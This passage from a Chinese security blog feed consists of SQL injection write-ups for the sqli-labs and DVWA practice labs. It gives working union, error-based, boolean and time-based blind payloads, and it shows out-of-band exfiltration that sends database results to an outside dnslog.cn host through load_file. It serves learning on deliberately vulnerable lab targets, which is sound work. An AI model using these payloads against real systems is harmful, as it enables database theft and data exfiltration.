src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164259.png"></p><p>说明是数字型注入，构造payload：</p><p>[<a href="http://127.0.0.1/sqli-labs/Less-35/?id=1%20and%20length(database())=8%23%5D">http://127.0.0.1/sqli-labs/Less-35/?id=1%20and%20length(database())=8%23]</a>(<a href="http://127.0.0.1/sqli-labs/Less-35/?id=1">http://127.0.0.1/sqli-labs/Less-35/?id=1</a> and length(database())=8%23)</p><p>回显正常，bool盲注成功：</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164310.png"></p><p>36</p><p>对于mysql_real_escape_string也可以使用宽字节注入</p><p>37</p><p>同样mysql_real_escape_string所以使用宽字节注入</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164345.png"></p><p>成功</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164349.png"></p><h2 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h2><p>38</p><p><a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-55">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-55</a></p><p>利用SQL注入漏洞外带查询</p><p><a href="https://www.cnblogs.com/renhaoblog/p/12912452.html">https://www.cnblogs.com/renhaoblog/p/12912452.html</a></p><p><a href="http://127.0.0.1/sqli-labs/Less-38/?id=1&#39;;select">http://127.0.0.1/sqli-labs/Less-38/?id=1&#39;;select</a> 1,2,load_file(concat(“\\“,hex(database()),”.1qk5u8.dnslog.cn\a.txt”))–+</p><p>45</p><p>密码处存在注入</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164358.png"></p><h2 id="Orderby注入"><a href="#Orderby注入" class="headerlink" title="Orderby注入"></a>Orderby注入</h2><p>46</p><p>手法：</p><p>报错注入</p><p><strong>布尔盲注：用order by rand(true)order by rand(false)</strong></p><p>危害：</p><p>脱库</p><p>getshell</p><p>52</p><p>尝试127.0.0.1/sqli-labs/Less-52/?sort1’%23</p><p>发现无返回，应该是拼接方式错了</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164426.png"></p><p>继续尝试数字型<img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164431.png"></p><p>正常返回，说明是数字型注入</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164437.png"></p><p>因为没有报错，所以无法使用报错注入，尝试布尔盲注</p><p>首先输入sort=rand(true)#,返回如下</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164443.png"></p><p>继续输入sort=rand(false)#,返回如下</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164448.png"></p><p>回显不同，说明可以用布尔盲注，输入?sort=rand(length(database())=7)#,返回如下说明括号内判断式为false</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164455.png"></p><p>继续尝试?sort=rand(length(database())=8)#,返回如下说明括号内判断式为true</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164500.png"></p><p>注入成功，数据库长度为8 </p><h2 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h2><p>57</p><p><a href="http://192.168.250.15/sqli-labs/Less-57/?id=1&#39;%20and%20sleep(5)%23">http://192.168.250.15/sqli-labs/Less-57/?id=1&#39;%20and%20sleep(5)%23</a> //结果没有延时，说明不是单引号</p><p><a href="http://192.168.250.15/sqli-labs/Less-57/?id=1&quot;%20and%20sleep(5)%23">http://192.168.250.15/sqli-labs/Less-57/?id=1&quot;%20and%20sleep(5)%23</a> //结果延时，说明是双引号</p><p>联合注入</p><p><a href="http://192.168.250.15/sqli-labs/Less-57/?id=1&quot;%20union%20select%201,2,3%20limit%201,1%23">http://192.168.250.15/sqli-labs/Less-57/?id=1&quot;%20union%20select%201,2,3%20limit%201,1%23</a></p><p>成功回显2，3</p><h2 id="DNSlog带外注入"><a href="#DNSlog带外注入" class="headerlink" title="DNSlog带外注入"></a>DNSlog带外注入</h2><p>58</p><p>输入<a href="http://192.168.250.15/sqli-labs/Less-58/index.php/?id=1%27%20and%20sleep(5)%23%E6%88%90%E5%8A%9F%E5%BB%B6%E6%97%B6%E4%BA%94%E7%A7%92%EF%BC%8C%E8%AF%B4%E6%98%8E%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%E4%B8%BA%E5%8D%95%E5%BC%95%E5%8F%B7">http://192.168.250.15/sqli-labs/Less-58/index.php/?id=1%27%20and%20sleep(5)%23成功延时五秒，说明闭合方式为单引号</a></p><p>尝试联合注入<a href="http://192.168.250.15/sqli-labs/Less-58/index.php/?id=1%27%20union%20select%201,2,3%20limit%201,1%23">http://192.168.250.15/sqli-labs/Less-58/index.php/?id=1%27%20union%20select%201,2,3%20limit%201,1%23</a></p><p>回显如下</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164511.png"></p><p>说明无法用联合注入回显到页面，因为总共只有五次机会所以只能联合注入，所以尝试dnslog外带注入，即将执行结果输出到dnslog中去：</p><p>进入<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p><p>获取域名服务器</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164517.png"></p><p>构建语句</p><p><a href="http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file">http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file</a>(concat(%27\\%27,(select group_concat(table_name) from information_schema.tables where table_schema=database()),%27.fkxo4a.dnslog.cn/abc.txt%27))%23</p><p>然后点击refresh record，看见表名已经输出出来了</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164522.png"></p><blockquote><p>注：有时候特殊字符不能被输出则用<a href="http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file">http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file</a>(concat(%27\\%27,(select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),%27.fkxo4a.dnslog.cn/abc.txt%27))%23</p></blockquote><p>然后爆字段名</p><p><a href="http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file">http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file</a>(concat(%27\\%27,(select hex(group_concat(column_name)) from information_schema.columns where table_name=’o5bhxcnlvf’),%27.fkxo4a.dnslog.cn/abc.txt%27))%23</p><p>成功回显，说明语句执行成功，可去dnslog处查看：</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164530.png"></p><p>点击refresh record，看见字段已经输出出来了</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164535.png"></p><p>用burp尽心十六进制解码得字段名为：</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164540.png"></p><p>输出数据：</p><p><a href="http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file">http://192.168.250.15/sqli-labs/Less-58/index.php?id=1%27%20union%20select%201,2,load_file</a>(concat(%27\\%27,(select hex(group_concat(sessid,secret_4DTV,tryy)) from challanges.o5bhxcnlvf),%27.fkxo4a.dnslog.cn/abc.txt%27))%23</p><p>得到密钥lwWTMDXztKcFyz5jgPoOcJ6i成功</p><p>59</p><p>输入?id=1%20and%20sleep(5)%23成功延时，所以数字型注入</p><p>并且有报错，可尝试报错注入</p><p>60</p><p>输入?id=1”) and sleep(5)%23成功延时，所以闭合方式为”)</p><p>有报错可以尝试报错注入，联合注入等</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210730164548.png"></p><p>61</p><p>输入?id=1”)) and sleep(5)%23成功延时，所以闭合方式为”))</p><p>有报错可以尝试报错注入，联合注入等</p><p>62</p><p>输入?id=1’) and sleep(5)%23成功延时，所以闭合方式为‘)</p><p>没有报错不能报错注入，可尝试dnslog外带注入这关给的次数有130次也可以尝试布尔盲注</p><p>63</p><p>输入?id=1’ and sleep(5)%23成功延时，所以闭合方式为’</p><p>没有报错不能报错注入，可尝试dnslog外带注入这关给的次数有130次也可以尝试布尔盲注</p><p>64</p><p>输入?id=1’ and sleep(5)%23成功延时，所以闭合方式为’</p><p>没有报错不能报错注入，可尝试dnslog外带注入这关给的次数有130次也可以尝试布尔盲注</p><blockquote><h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><p>对于例如?id=1’ and sleep(5)#</p><p>在浏览器搜索框可以输入为?id=1’ and sleep(5)%23，因为浏览器会给我们自动url编码</p><p>而在hackbar和burp中要输入的是url编码后的payload，即?id=1%27%20and%20sleep(5)#</p><p>注：payload中有&amp;等符号一样要进行编码，&amp;是%26</p></blockquote><blockquote><h2 id="判断引号闭合方式"><a href="#判断引号闭合方式" class="headerlink" title="判断引号闭合方式"></a><strong>判断引号闭合方式</strong></h2><ol><li>最简单的就是?id=1’%23    ?id=1”%23等等如果有好几种闭合方式都正常返回，那么就用方法2</li><li>?id=1’ and ‘1’=’1          ?id=1” and “1”=”1如果还是均正常返回尝试方法3</li><li>?id=1’ and sleep(5)%23       ?id=1” and sleep(5)%23哪一个延时了就是正确的闭合方式，无论有没有正常回显</li></ol><p>常见闭合方式</p><ul><li>数字型</li><li>‘ ‘</li><li>“ “</li><li>( )</li><li>(( ))</li><li>(‘ ‘)</li><li>(“ “)</li><li>((‘ ‘))</li><li>((“ “))</li></ul><p>注：以后payload中的#全部改写为%23，因为浏览器会认为#是锚点从而不算在id参数内容里面</p></blockquote><blockquote><p>当执行结果无法通过布尔盲注或者联合查询注入进行显示的话，可以尝试将执行结果通过dnslog带外注入输出到dnslog中去</p></blockquote><h2 id="注入绕过方法"><a href="#注入绕过方法" class="headerlink" title="注入绕过方法"></a>注入绕过方法</h2><blockquote><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313">https://blog.csdn.net/huanghelouzi/article/details/82995313</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2021/07/24/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/24/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>在B/S模式中，用户可以通过Get或Post等方式，对服务器发出HTTP请求。在服务器端，对数据库执行查询操作，将查询的结果返回浏览器端。黑客利用上述过程，将精心构造的请求放到传入的变量参数中，让服务器端执行恶意代码，从而达到了读取数据库中敏感信息的效果，甚至将数据库删除。这一攻击过程就是SQL注入，它的原理如图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200445.png"></p><p>其成因可归结为以下两个原理叠加造成：</p><p>1、程序编写者在处理程序和数据库交互时，使用字符串凭借的方式构造SQL语句。</p><p>2、未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol><li>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</li><li>可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</li><li>如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</li><li>经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</li></ol><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><h2 id="按照注入点类型分类"><a href="#按照注入点类型分类" class="headerlink" title="按照注入点类型分类"></a>按照注入点类型分类</h2><ol><li><p>数字型注入</p></li><li><p>字符型注入</p></li><li><p>搜索型注入</p><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword=关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：</p><p>select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’=’%1%’</p></li></ol><h2 id="按照注入点位置分类"><a href="#按照注入点位置分类" class="headerlink" title="按照注入点位置分类"></a>按照注入点位置分类</h2><ol><li><p>GET注入</p><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p></li><li><p>POST注入</p><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p></li><li><p>Cookie注入</p><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p></li><li><p>HTTP头部注入</p><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p></li></ol><h2 id="按照执行效果分类"><a href="#按照执行效果分类" class="headerlink" title="按照执行效果分类"></a>按照执行效果分类</h2><ol><li>联合注入（有回显）</li><li>报错注入（有报错回显）</li><li>布尔盲注（响应页面有布尔类型状态）</li><li>延时注入</li><li>堆叠查询注入</li></ol><h2 id="常用的mysql系统函数"><a href="#常用的mysql系统函数" class="headerlink" title="常用的mysql系统函数"></a>常用的mysql系统函数</h2><table><thead><tr><th>函数</th><th>解释</th><th>用法</th></tr></thead><tbody><tr><td>version()</td><td>mysql 数据库版本</td><td>select version();</td></tr><tr><td>database()</td><td>当前数据库名</td><td>select database();</td></tr><tr><td>user()</td><td>用户名</td><td>select user();</td></tr><tr><td>current_user()</td><td>当前用户名</td><td>select current_user();</td></tr><tr><td>system_user()</td><td>系统用户名</td><td>select system_user();</td></tr><tr><td>@@datadir</td><td>数据库路径</td><td>select @@datadir;</td></tr><tr><td>@@version_compile_os</td><td>操作系统版本</td><td>select @@version_compile_os;</td></tr><tr><td>length()</td><td>返回字符串长度</td><td>select length(version());</td></tr><tr><td>substr()</td><td>1、截取的字符串</td><td>select substr(“version()”,2);</td></tr><tr><td></td><td>2、截取的起始位置默认从1开始</td><td>select substr(version(),2,10);</td></tr><tr><td>left()</td><td>从左侧开始去指定字符个数的字符串</td><td>select left(version(),2);</td></tr><tr><td>group_concat()</td><td>连接一个组的字符串</td><td>select group_concat(id) from users;</td></tr><tr><td>ord()</td><td>返回ASCII码</td><td>select ord(‘a’);</td></tr><tr><td>hex()</td><td>将字符串转换为十六进制</td><td>select hex(‘a’);</td></tr><tr><td>md5()</td><td>返回MD5 值</td><td>select md5(‘123456’);</td></tr><tr><td>sleep()</td><td>睡眠时间为指定的秒数</td><td>select sleep(5);</td></tr><tr><td>if(true,t,f)</td><td>if判断</td><td>select if(true,1,0);</td></tr></tbody></table><h2 id="常用的引号闭合方式"><a href="#常用的引号闭合方式" class="headerlink" title="常用的引号闭合方式"></a>常用的引号闭合方式</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1&quot;</span></span><br><span class="line"><span class="string">1)</span></span><br><span class="line"><span class="string">1&#x27;</span>)</span><br><span class="line"><span class="number">1</span>&quot;) </span><br><span class="line">1&quot;))</span><br></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>判断存在注入的地点，比如Get请求参数，POST提交的表单参数，cookie参数，HTTP头部参数等</p><h2 id="判断是否为数字型注入"><a href="#判断是否为数字型注入" class="headerlink" title="判断是否为数字型注入"></a>判断是否为数字型注入</h2><p>首先判断是否为数字型注入，利用输入</p><p>?id=1 and 1=1</p><p>?id=1 and 1=2</p><p>如果返回了不同页面则是数字型注入</p><blockquote><p>如果后端利用的是字符型时，后端sql语句就会被拼接为….. where id =’1 and 1=1’;然后在执行该sql语句时，mysql会对该sql语句进行解析（大概就是这意思QAQ），mysql发现id字段为int型则会将sql语句中的 where id =’1 and 1=1’变为int型，而这又是一个字符串，<strong>mysql只能将’1 and 1=1’变为’1’了</strong>所以最后执行的sql语句为….. where id =’1’;</p><p>所以如果是字符型注入的话?id=1 and 1=1，?id=1 and 1=2执行效果和返回页面是相同的</p></blockquote><h2 id="判断是否为字符型注入"><a href="#判断是否为字符型注入" class="headerlink" title="判断是否为字符型注入"></a>判断是否为字符型注入</h2><p>输入</p><p>?id=1’#</p><p>?id=1”#</p><p>?id=1’)#</p><p>…….</p><p>哪个页面返回正常则说明是字符型注入，并且可推断出引号闭合方式</p><h2 id="第一阶段工作完成"><a href="#第一阶段工作完成" class="headerlink" title="第一阶段工作完成"></a>第一阶段工作完成</h2><h2 id="第二阶段（根据回显效果，选择如下一种）"><a href="#第二阶段（根据回显效果，选择如下一种）" class="headerlink" title="第二阶段（根据回显效果，选择如下一种）"></a>第二阶段（根据回显效果，选择如下一种）</h2><h2 id="判断有无回显，联合注入"><a href="#判断有无回显，联合注入" class="headerlink" title="判断有无回显，联合注入"></a>判断有无回显，联合注入</h2><blockquote><p>SQL union操作符</p><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果。</p><p>注意SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure><p><strong>例如有如下两个表</strong></p><p><strong>Employees_China:</strong></p><table><thead><tr><th align="left">E_ID</th><th align="left">E_Name</th></tr></thead><tbody><tr><td align="left">01</td><td align="left">ZhangHua</td></tr><tr><td align="left">02</td><td align="left">WangWei</td></tr><tr><td align="left">03</td><td align="left">CarterThomas</td></tr><tr><td align="left">04</td><td align="left">YangMing</td></tr></tbody></table><p><strong>Employees_USA:</strong></p><table><thead><tr><th align="left">E_ID</th><th align="left">E_Name</th></tr></thead><tbody><tr><td align="left">01</td><td align="left">AdamsJohn</td></tr><tr><td align="left">02</td><td align="left">BushGeorge</td></tr><tr><td align="left">03</td><td align="left">CarterThomas</td></tr><tr><td align="left">04</td><td align="left">GatesBill</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> E_Name <span class="keyword">FROM</span> Employees_China</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> E_Name <span class="keyword">FROM</span> Employees_USA</span><br></pre></td></tr></table></figure><p>执行结果：</p><table><thead><tr><th align="left">E_Name</th></tr></thead><tbody><tr><td align="left">ZhangHua</td></tr><tr><td align="left">WangWei</td></tr><tr><td align="left">CarterThomas</td></tr><tr><td align="left">YangMing</td></tr><tr><td align="left">AdamsJohn</td></tr><tr><td align="left">BushGeorge</td></tr><tr><td align="left">GatesBill</td></tr></tbody></table><p>再例如dvwa的low级别：select first_name,last_name from users where id =’1’ union select 1,2#</p><p>就会返回：</p><table><thead><tr><th>first_name</th><th>last_name</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>1</td><td>2</td></tr></tbody></table><p>页面显示如下：</p><p>   <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200504.png"></p></blockquote><p>输入以下来判断后端查询的字段数</p><p>?id=1’ union select 1,2</p><p>?id=1’ union select 1,2,3</p><p>?id=1’ union select 1,2,3,4</p><p>…..</p><p>哪个页面正常返回说明有几个字段，根据页面回显的数字就可以将union select后面的对应数字换为其他语句。eg：</p><p>1’ union select version(),database()#</p><p>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=”dvwa”#</p><p>等等</p><p>然后进行联合注入，即用union select推出数据库名，表名，字段名，数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）<span class="operator">/</span><span class="operator">/</span>推断查询字段个数</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2# </span></span><br><span class="line"><span class="string">（2）//显示数据库名和版本</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),database()# </span><br><span class="line">（<span class="number">3</span>）<span class="operator">/</span><span class="operator">/</span>推出dvwa数据库中的所有表,压缩显示</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;dvwa&quot;# </span></span><br><span class="line"><span class="string">（4）//推出users表的所有字段，压缩显示</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;# </span><br><span class="line">（<span class="number">5</span>）<span class="operator">/</span><span class="operator">/</span>推出users表的所有username和password，逐一显示</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from users# </span></span><br><span class="line"><span class="string">（6）//推出users表的所有first_name和password,压缩显示</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(first_name,password) <span class="keyword">from</span> users# </span><br><span class="line">（<span class="number">7</span>）<span class="operator">/</span><span class="operator">/</span>推出users表的所有user_id,first_name和password,压缩显示</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(user_id,first_name),group_concat(password) from users# </span></span><br><span class="line"><span class="string">（8）//推出users表的所有user_id,first_name,last_name和password,压缩显示                      下面会说压缩显示和逐一显示的区别</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(user_id,first_name,last_name),group_concat(password) <span class="keyword">from</span> users#</span><br></pre></td></tr></table></figure><blockquote><p><strong>group_concat用法：</strong></p><p><strong>将返回的结果集转换为一个字符串，目的是为了在一行输出</strong></p><p>例如SELECT group_concat(E_Name) FROM Employees_China   //表在上面</p><p>则会返回：</p><p>ZhangHua,WangWei,CarterThomas,YangMing</p><p>再例如dvwa的low级别</p><p>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=”dvwa”#</p><p>提交后到了后端完整的sql语句应该是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> first_name,last_name <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;dvwa&quot;#</span><br></pre></td></tr></table></figure><p>对于union后面的select 1,group_concat(table_name) from information_schema.tables where table_schema=”dvwa”#可以这样理解</p><p>首先其返回结果为</p><table><thead><tr><th align="center">1</th><th>select  group_concat(table_name) from information_schema.tables where table_schema=”dvwa”#的执行结果</th></tr></thead></table><p>而其中的select  group_concat(table_name) from information_schema.tables where table_schema=”dvwa”#可以这样理解</p><p>首先先执行select  table_name from information_schema.tables where table_schema=”dvwa”#</p><p>得到结果：</p><table><thead><tr><th>table_name</th></tr></thead><tbody><tr><td>guestbook</td></tr><tr><td>users</td></tr></tbody></table><p><strong>然后再执行group_concat得到结果：guestbook,users</strong></p><hr><p>注：如果上面得到结果为</p><table><thead><tr><th>table_name</th><th>table_name2</th></tr></thead><tbody><tr><td>aaa</td><td>bbb</td></tr><tr><td>ccc</td><td>ddd</td></tr></tbody></table><p>则执行group_concat得到结果：aaabbb,cccddd</p><hr><p>所以最终结果为</p><table><thead><tr><th>first_name</th><th>last_name</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>1</td><td>guestbook,users</td></tr></tbody></table><p>页面展示效果为：</p><p>  <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200517.png"></p><hr><p><strong>用不用group_concat只是形式上的不同，但有的时候后端再限制limit 1时就要用group_concat,如下为各种sql语句返回结果，目的熟悉sql语句，重点注意逐一显示和压缩显示的区别：</strong></p><p>第（4）句完整sql语句返回结果：</p><table><thead><tr><th>column_name</th></tr></thead><tbody><tr><td>user_id</td></tr><tr><td>first_name</td></tr><tr><td>last_name</td></tr><tr><td>user</td></tr><tr><td>password</td></tr><tr><td>avatar</td></tr><tr><td>last_login</td></tr><tr><td>failed_login</td></tr></tbody></table><p>页面显示效果：</p><p>  <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200522.png"></p><p>第（5）句完整sql语句返回结果：</p><table><thead><tr><th>first_name</th><th>last_name</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>admin</td><td>202cb962ac59075b964b07152d234b70</td></tr><tr><td>gordonb</td><td>e99a18c428cb38d5f260853678922e03</td></tr><tr><td>1337</td><td>8d3533d75ae2c3966d7e0d4fcc69216b</td></tr><tr><td>pablo</td><td>0d107d09f5bbe40cade3de5c71e9e9b7</td></tr><tr><td>smithy</td><td>5f4dcc3b5aa765d61d8327deb882cf99</td></tr></tbody></table><p>页面显示效果：</p><p>  <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200527.png"></p><p>第（6）句完整sql语句返回结果：</p><table><thead><tr><th>first_name</th><th>last_name</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>1</td><td>admin202cb962ac59075b964b07152d234b70,Gordone99a18c428cb38d5f260853678922e03,Hack8d3533d75ae2c3966d7e0d4fcc69216b,Pablo0d107d09f5bbe40cade3de5c71e9e9b7,Bob5f4dcc3b5aa765d61d8327deb882cf99</td></tr></tbody></table><p>页面显示效果：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200912.png"></p><p>第（7）句完整sql语句返回结果：</p><table><thead><tr><th>first_name</th><th>last_name</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>1admin,2Gordon,3Hack,4Pablo,5Bob</td><td>202cb962ac59075b964b07152d234b70,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99</td></tr></tbody></table><p>页面显示效果：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200536.png"></p><p>第（8）句完整sql语句返回结果：</p><table><thead><tr><th>first_name</th><th>last_name</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>1adminadmin,2GordonBrown,3HackMe,4PabloPicasso,5BobSmith</td><td>202cb962ac59075b964b07152d234b70,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99</td></tr></tbody></table><p>页面显示效果：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200541.png"></p><p><strong>如上所示，当三个字段进行group_concat时就会先将每一行数据拼接起来，然后已逗号分隔符来连接成字符串</strong></p></blockquote><h2 id="判断有无报错回显，报错注入"><a href="#判断有无报错回显，报错注入" class="headerlink" title="判断有无报错回显，报错注入"></a>判断有无报错回显，报错注入</h2><p>如图如果有报错回显，则可以使用报错注入，即将恶意sql语句插入到特殊构造的报错语句中去</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210724200548.png"></p><p>报错注入常用payload</p><blockquote><p><a href="https://blog.csdn.net/silence1_/article/details/90812612">https://blog.csdn.net/silence1_/article/details/90812612</a></p></blockquote><p>注意该blog里面payload最后没加#，需自己添加</p><p>eg: <a href="http://192.168.43.61//DVWA/vulnerabilities/sqli/index.php?id=%27and(select%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database())),0x7e))#&amp;Submit=Submit">http://192.168.43.61//DVWA/vulnerabilities/sqli/index.php?id=%27and(select%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database())),0x7e))#&amp;Submit=Submit</a> //爆数据库表</p><h2 id="判断页面有无布尔类型状态，布尔盲注"><a 